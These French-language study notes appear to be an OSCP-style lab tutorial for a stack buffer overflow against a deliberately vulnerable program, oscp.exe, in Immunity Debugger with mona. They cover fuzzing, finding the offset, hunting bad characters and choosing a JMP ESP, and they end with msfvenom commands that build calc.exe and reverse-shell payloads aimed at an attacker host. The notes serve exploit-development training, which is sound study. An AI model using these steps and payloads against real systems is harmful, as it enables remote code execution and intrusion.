```ad-note
Dans Immuniyy Debugger, on peut retourner à l'affichage principale en cliquant sur l'onglet **Window --> CPU**
Il faut lancer les scripts avec PYTHON3
```


## Mona Configuration
##### Installation de mona
https://github.com/corelan/mona
Mettre mona.py dans le répertoire:
`C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`

### Mona Configuration
Configuration du working folder :
```
!mona config -set workingfolder c:\mona\%p
```
![image](https://user-images.githubusercontent.com/93264654/206850048-908612fa-1de5-479b-8562-db6bb5a950f2.png)

Cette commande permet de créer un dossier qui sera utilisé par mona pour placer les logs/outputs.

## Lancement du programme dans Immunity

Une fois sur Immunity et mona configuré, on lance le programme en allant dans :
`File -> Open -> Desktop -> vulnerable-apps -> oscp -> oscp.exe`

![image](https://user-images.githubusercontent.com/93264654/206851817-91bf3925-ac69-4da4-a745-7aad4fe36821.png)

Puis on le démarre en cliquant sur le bouton **play**

![image](https://user-images.githubusercontent.com/93264654/206851828-e119ff91-0c74-43e9-915a-23c1e843ea57.png)



## Lister les commandes

On se connecte à l'application avec `nc -nv IP Port` puis on essaie de voir qu'elle sont les commandes de l'application qui nous permettent d'envoyer des données.

## 1 - Fuzzing

La première étape est de déterminer la commande vulnérable en faisant crash l'application.
Dans le script **fuzzer.py** on modifie l'**IP** et le **Port**, ainsi que le **Prefix**.
On attache et lance l'application dans Immunity puis on exécute le script.
On note l'offset trouvé, dans la capture ci-dessous on voit que l'application crash à 2000 octets, cela signifie que la **Return Address** est située entre **1900** et **2000** octets.

![image](https://user-images.githubusercontent.com/93264654/206849473-34be38ee-5209-4b2f-b9c1-78e4db61c0ba.png)

On redemarre l'application

![image](https://user-images.githubusercontent.com/93264654/206851859-3e77a2ff-b5bd-4d56-8466-a2e15bbcb36e.png)

## 2 - Offset

Pour trouver l'**EIP**, On génère un paterne avec metasploit de 400 octets de plus que le crash (le crash était à 2000 octets, donc on génère 2400 caractères) :
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```

Mettre l'output dans la variable **payload** de **exploit.py** et exécuter le script (ne pas oublier d'abord de restart l'application dans Immunity).

![image](https://user-images.githubusercontent.com/93264654/206849907-e2a0571d-2fbe-4ddd-9c5c-f139a7bb0c4e.png)



Lorsque l'application crash :
- on note la valeur de EIP en faisant **clic droit sur la valeur de l'EIP --> copy selection to Clipboard**

Puis on récupère l'offset de l'EIP avec la commande : 

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <valeur_de_EIP>
```

On peut aussi trouver l'offset EIP et ESP avec la commande : `!mona findmsp -distance 2400`
![image](https://user-images.githubusercontent.com/93264654/206849981-248be463-8efc-4f66-90b7-cf1f644122ce.png)


On note la valeur de l'offset retournée par cette commande dans la variable **offset** du script **exploit.py**.
On éfface le contenu de la variable **payload**.

![image](https://user-images.githubusercontent.com/93264654/206850260-f842aa1c-0da2-4e2a-94f5-003a24eb9422.png)


## 3 - Control the EIP

Cette étape consiste à vérifier si l'offset trouvé est le bon, en écrivant une suite de caractères B dans l'EIP.
On met dans la variable **retn** de **exploit.py** `retn="BBBB"`


On exécute le script.

Dans Immunity si l'EIP contient une suite de caractères B (/x42 en hex), alors l'offset trouvé est le bon.

## 4 - Bad Chars

A présent, nous allons rechercher les mauvais caractères.

On créer dans mona une liste de caractères en excluant directement le null byte x00 qui est bad chars par défaut (Il correspond au caractère ASCII fin de string)

```
!mona bytearray -cpb "\x00"
```
On exécute le script **genere.py** et on colle le  résultat dans la variable **payload** du script **exploit.py**

![image](https://user-images.githubusercontent.com/93264654/206850775-413305a6-92a4-43f6-be2a-133bf842127d.png)

On redémarre le programme dans Immunity puis on exécute **exploit.py**.

Une fois le programme crash, on va regarder les cractères manquant dans la stack afin de déterminer les mauvais cractères. On utilise dans Immunity la commande :

```
!mona compare -a ESP -f C:\mona\oscp\bytearray.bin
```
Cette commande permet de comparer la liste de caractère généré par mona avec les caractères présents dans la stack.

Dans l'exemple, mona nous retourne le cractères hexa \x07. Il nous indique aussi que la caractères \x00 à été omis du résultat (nous l'avons exclus précédemment).

![image](https://user-images.githubusercontent.com/93264654/206851003-3b808f4a-66ff-49c8-8998-fdcb981482ed.png)

On note sur un bloc note le cractère \x07.

On régénère avec mona nouveau avec mona un **bytearray** en excluant le bad chars trouvé \x07 :

```
!mona bytearray -cpb "\x00\x07"
```

Puis on supprime dans la variable **payload** du script **exploit.py** le mauvais caractères "\x07"
![image](https://user-images.githubusercontent.com/93264654/206851073-481feb33-94e1-4112-b50f-96181735487e.png)

On repette l'opération jusqu'à ce que mona nous affiche que rien n'est changé.
Si il n'y a plus de badchars, mona doit afficher un statuts **unmodified** et on doit avoir un message dans la console qui dit :  **!!! Hoooray, normal shellcode unmodified !!!**

![image](https://user-images.githubusercontent.com/93264654/206851102-8e59fa84-c637-4d1d-b1f5-0ba6061588dc.png)

### b. Recherche d'un JMP ESP

On demande à mona de trouver une instruction **JMP ESP** qui permet au processeur d'exécuter ce que nous avons mis dans le stack. 

Il faut que l'adresse du JMP ESP ne contienne pas de badchars, on va les exclure lors de la recherche.

On fait crash le programme avec **exploit.py** puis on tape dans Immunity :

```
!mona jmp -r esp -cpb "\x00\x07"
```
Il faut choisir un JMP ESP avec toutes les protections en **False** et qu'il soit de préférence dans une DLL.

Dans notre exemple, on prend le JMP ESP 0x625011c7

![image](https://user-images.githubusercontent.com/93264654/206851283-1ad1a114-7170-4d9a-ad7e-c9ee563bc83c.png)

On rentre l'adresse du JMP ESP dans la variable **retn** du script **exploit.py.
Il faut entrer l'adresse à l'envers car le 32bits utilise du **little endian**.

\x62\x50\x11\xc7 devient : \xc7\x11\x50\x62

![image](https://user-images.githubusercontent.com/93264654/206851449-84d4f656-cc75-4de4-aa6d-ce47c97978cb.png)




## 6 - Pop calc

On va confirmer l'execution de code sur la victime en essayant de lancer une calculatrice. Cela peut être utilisé pour validé le contenu de l'exploit.

On génère un shellcode avec msfvenom qui permet de pop une calculatrice :
```
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "<badchars>" -f c

Dans notre exemple cela donne :
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "\x00\x07" -f c
```

On copie le résultat dans la variable **payload** de **exploit.py** en l'entourant avec des parenthèses.

![image](https://user-images.githubusercontent.com/93264654/206851570-07600e30-f60c-47e8-bba5-36b8e26243bb.png)

On ajoute aussi dans la variable **pading** `"x90" * 16`

![image](https://user-images.githubusercontent.com/93264654/206851582-a08273c2-cee0-4ad8-9c30-c8a3b4e82a5a.png)

On exécute le script, une calculatrice devrait pop sur la machine victime.

## 7 - Reverse Shell

Maintenant, on peut craft n'importe quel shellcode du moment qu'on respecte les bad chars.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=4444 EXITFUNC=thread -b "<badchars>" -f c

Dans notre exemple :
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=4444 EXITFUNC=thread -b "\x00\x07" -f c
```

On copie le résultat dans la variable **payload** de **exploit.py** en l'entourant avec des parenthèses.

![image](https://user-images.githubusercontent.com/93264654/206851570-07600e30-f60c-47e8-bba5-36b8e26243bb.png)

Il ne reste plus qu'a exécuter **exploit.py** pour obtenir un reverse shell.
